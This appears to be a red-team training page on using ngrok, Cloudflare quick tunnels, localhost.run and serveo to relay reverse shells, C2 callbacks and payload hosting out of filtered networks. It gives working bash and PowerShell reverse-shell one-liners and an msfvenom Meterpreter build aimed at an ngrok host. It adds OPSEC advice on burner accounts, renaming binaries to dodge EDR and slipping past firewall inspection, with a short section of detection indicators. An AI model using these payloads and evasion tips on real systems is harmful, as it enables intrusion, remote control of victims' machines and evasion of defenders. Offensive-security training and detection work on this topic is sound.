---
layout: training-page
title: "Ngrok & Commercial Tunneling Services — Red Team Academy"
module: "Pivoting & Tunneling"
tags:
  - ngrok
  - cloudflared
  - reverse-tunnel
  - commercial-tunneling
page_key: "pivoting-ngrok"
render_with_liquid: false
---

# Ngrok & Commercial Tunneling Services

## Overview

Commercial tunneling services expose a local port through their cloud infrastructure by routing inbound connections through the provider's relay servers. From the target network's perspective, the callback goes to a trusted CDN or well-known hostname — not a raw attacker IP. This makes them useful for catching reverse shells from egress-filtered environments and for bypassing firewalls that block unknown external IPs.

Common services covered here:
- **ngrok** — the most widely used; TCP and HTTP tunnels
- **Cloudflare Tunnel (cloudflared)** — HTTPS only; free with no account using quick tunnels
- **localhost.run** — SSH-based, no install required
- **serveo.net** — SSH-based, no install required

**Attribution risk:** ngrok and cloudflared require account registration. Always use dedicated burner accounts. Services like localhost.run and serveo.net require no account but are less reliable.

## Ngrok

### Setup

```bash
# Method 1: Install via package manager
curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc \
    | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null
echo "deb https://ngrok-agent.s3.amazonaws.com buster main" \
    | sudo tee /etc/apt/sources.list.d/ngrok.list
sudo apt update && sudo apt install ngrok

# Method 2: Download binary directly
# https://ngrok.com/download — get Linux/Windows/macOS binary
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
tar -xzf ngrok-v3-stable-linux-amd64.tgz
chmod +x ngrok && sudo mv ngrok /usr/local/bin/

# Configure your auth token (from ngrok.com dashboard):
ngrok config add-authtoken YOUR_AUTH_TOKEN_HERE

# Verify:
ngrok version
```

### Basic Usage

```bash
# Expose a TCP port (reverse shell listener):
ngrok tcp 4444
# Returns something like:
# Forwarding: tcp://0.tcp.ngrok.io:12345 -> localhost:4444

# Expose an HTTP server (C2 callback, payload hosting):
ngrok http 8080
# Returns: https://abc123.ngrok.io -> http://localhost:8080

# Expose with a custom subdomain (paid plan):
ngrok http --domain=myshell.ngrok.io 8080

# Multiple tunnels via config file:
ngrok start --config ~/.config/ngrok/ngrok.yml --all

# Inspect traffic via ngrok web interface:
# ngrok opens http://127.0.0.1:4040 — shows all tunneled requests
```

### Ngrok Config File

```yaml
# ~/.config/ngrok/ngrok.yml
version: "2"
authtoken: YOUR_TOKEN_HERE
tunnels:
  shell:
    proto: tcp
    addr: 4444
  http-c2:
    proto: http
    addr: 8080
  https-payload:
    proto: http
    addr: 8000
    schemes:
      - https
```

```bash
# Start all configured tunnels at once:
ngrok start --all

# Start a specific named tunnel:
ngrok start shell
```

### Using Ngrok for Reverse Shells

```bash
# Step 1: Start the ngrok TCP tunnel
ngrok tcp 4444
# Note the forwarded address: tcp://0.tcp.ngrok.io:XXXXX

# Step 2: Start your local listener
nc -lvnp 4444
# Or MSF handler (see below)

# Step 3: Build payload pointing to ngrok address
# Netcat reverse shell via bash:
bash -i >& /dev/tcp/0.tcp.ngrok.io/XXXXX 0>&1

# Meterpreter payload:
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=0.tcp.ngrok.io LPORT=XXXXX \
    -f exe -o shell.exe

# PowerShell reverse shell:
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('0.tcp.ngrok.io',XXXXX);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$r=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($r,0,$r.Length)}"

# Step 4: MSF handler for Meterpreter
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
run
# Listener on localhost:4444 — ngrok forwards external traffic here
```

### Ngrok API — Inspect Tunnels Programmatically

```bash
# Ngrok exposes a local API at :4040 for inspection and management:
curl http://127.0.0.1:4040/api/tunnels | python3 -m json.tool

# Get just the public URL of the tcp tunnel:
curl -s http://127.0.0.1:4040/api/tunnels | \
    python3 -c "import sys,json; t=json.load(sys.stdin)['tunnels']; \
    [print(x['public_url']) for x in t if x['proto']=='tcp']"

# Useful in automation: start ngrok, query API, inject URL into payload
```

## Cloudflare Tunnel (cloudflared)

Cloudflare Tunnel routes HTTPS traffic from Cloudflare's edge to a local service. The free "quick tunnel" option requires no Cloudflare account and provides an HTTPS URL on trycloudflare.com.

```bash
# Install cloudflared:
curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 \
    -o cloudflared
chmod +x cloudflared
sudo mv cloudflared /usr/local/bin/

# Quick tunnel — no account, no install:
cloudflared tunnel --url http://localhost:8080
# Returns: https://random-words-123.trycloudflare.com → localhost:8080

# The tunnel URL uses trycloudflare.com — less suspicious than a raw IP
# Useful for: payload hosting, C2 callbacks over HTTPS

# Authenticated tunnel (requires Cloudflare account + owned domain):
cloudflared tunnel login
# Opens browser to authorize with your Cloudflare account

cloudflared tunnel create redteam-c2
cloudflared tunnel route dns redteam-c2 c2.yourdomain.com
cloudflared tunnel run redteam-c2
# Now: https://c2.yourdomain.com → localhost:8080

# Config file for Cloudflare tunnel:
cat > ~/.cloudflared/config.yml << 'EOF'
tunnel: TUNNEL-UUID
credentials-file: /root/.cloudflared/TUNNEL-UUID.json

ingress:
  - hostname: c2.yourdomain.com
    service: http://localhost:8080
  - service: http_status:404
EOF

cloudflared tunnel run
```

## localhost.run & serveo.net — No-Account Options

Both services use SSH reverse tunneling to expose local ports. No account, no binary installation — just a standard SSH client.

```bash
# ── localhost.run ─────────────────────────────────────────────
# HTTP tunnel — expose local port 8080:
ssh -R 80:localhost:8080 nokey@localhost.run
# Returns: https://random-id.lhr.life → localhost:8080

# Custom subdomain (if available):
ssh -R mysubdomain:80:localhost:8080 nokey@localhost.run

# TCP tunnel on localhost.run (requires account for TCP):
# HTTP/HTTPS only on the free no-key option

# ── serveo.net ────────────────────────────────────────────────
# HTTP tunnel:
ssh -R 80:localhost:8080 serveo.net
# Returns: https://serveo.net → localhost:8080 (via random subdomain)

# Custom subdomain on serveo:
ssh -R mysubdomain:80:localhost:8080 serveo.net

# TCP port forward on serveo:
ssh -R 4444:localhost:4444 serveo.net
# Returns: connect to serveo.net:PORT to reach localhost:4444

# Keep tunnel open with autossh:
autossh -M 0 -R 80:localhost:8080 serveo.net

# Limitations:
# - No account: less reliable, shared infrastructure
# - serveo.net has had periods of downtime
# - SSH to external server may be logged
```

## OPSEC Considerations

```bash
# Ngrok:
# - All connections are logged on ngrok's servers by default
# - Free plan: logs accessible in web dashboard
# - Paid plan: can configure log retention
# - The auth token is tied to your account — use a burner email
# - ngrok.io domain is well-known in threat intel feeds
# - Some corporate firewalls explicitly block *.ngrok.io

# Cloudflare:
# - Quick tunnels (trycloudflare.com): no account required, less attributable
# - Authenticated tunnels: tied to your Cloudflare account
# - Cloudflare CDN is trusted by most firewalls — good for bypassing inspection
# - Traffic encrypted end-to-end: harder for MitM inspection
# - Less suspicious domain than ngrok.io

# localhost.run / serveo.net:
# - No account registration: no persistent attribution
# - SSH connection itself is logged on provider side
# - Less reliable than ngrok for production use
# - Good for quick one-off use where account trail is a concern

# General OPSEC rules for commercial tunneling:
# 1. Never use your personal/work ngrok account
# 2. Create burner accounts with single-use email addresses
# 3. Use HTTPS tunnels over TCP when possible (blends with CDN traffic)
# 4. Rotate tunnel URLs between operations
# 5. Tear down tunnels when not in use (reduces exposure window)
# 6. Prefer Cloudflare quick tunnels for lowest attribution risk
```

## Detection Context

```bash
# Network-level indicators:
# - DNS queries for *.ngrok.io, *.ngrok-free.app (ngrok)
# - DNS queries for *.trycloudflare.com (cloudflare quick tunnels)
# - DNS queries for *.lhr.life (localhost.run)
# - Connections to serveo.net on port 22 or 443

# Firewall / proxy detection:
# Corporate DLP proxies often have category blocks for tunneling services
# Check if these domains are blocked before use:
curl -s -o /dev/null -w "%{http_code}" https://ngrok.io
curl -s -o /dev/null -w "%{http_code}" https://trycloudflare.com

# From the target network — test egress to common tunneling services:
# (do this before building payloads)
curl -sk https://ngrok.io | head -5
# If connection refused/timeout — ngrok is blocked, try cloudflare or serveo

# Endpoint detection:
# ngrok process running on an endpoint is itself a detection indicator
# EDR tools may flag ngrok.exe as a dual-use tool
# Use --config to run headless, or rename the binary

# SIEM detection rules:
# - Alert on DNS queries matching *.ngrok.io, *.trycloudflare.com from internal hosts
# - Alert on outbound SSH to serveo.net or localhost.run from workstations
# - Alert on HTTP connections to Cloudflare IP ranges on non-standard ports
```

## Comparison of Services

```
┌──────────────────┬───────────┬──────────┬───────────┬──────────────────────────┐
│ Service          │ Protocol  │ Account  │ Reliable  │ Notes                    │
├──────────────────┼───────────┼──────────┼───────────┼──────────────────────────┤
│ ngrok (free)     │ TCP/HTTP  │ Required │ High      │ Well-known, easily blocked│
│ ngrok (paid)     │ TCP/HTTP  │ Required │ Very High │ Custom domains, less IDS │
│ cloudflared quick│ HTTPS     │ None     │ High      │ Low attribution risk      │
│ cloudflared auth │ HTTPS     │ Required │ Very High │ Custom domain, stable     │
│ localhost.run    │ HTTP      │ None     │ Medium    │ SSH-based, no install     │
│ serveo.net       │ HTTP/TCP  │ None     │ Medium    │ Sometimes unreliable      │
└──────────────────┴───────────┴──────────┴───────────┴──────────────────────────┘

# Decision guide:
# Need TCP (not just HTTP)?             → ngrok tcp
# Lowest attribution risk?              → cloudflared quick tunnel
# No binary, quick and dirty?           → localhost.run or serveo.net
# Stable long-term with custom domain?  → ngrok paid or cloudflared authenticated
# Target network blocks ngrok?          → try cloudflared or serveo (different domains)
```

## Resources

- Ngrok — https://ngrok.com
- Ngrok download — https://ngrok.com/download
- Cloudflare Tunnel — https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/
- cloudflared — https://github.com/cloudflare/cloudflared
- localhost.run — https://localhost.run
- serveo.net — https://serveo.net
- MITRE T1572 — Protocol Tunneling
- MITRE T1090.002 — Proxy: External Proxy
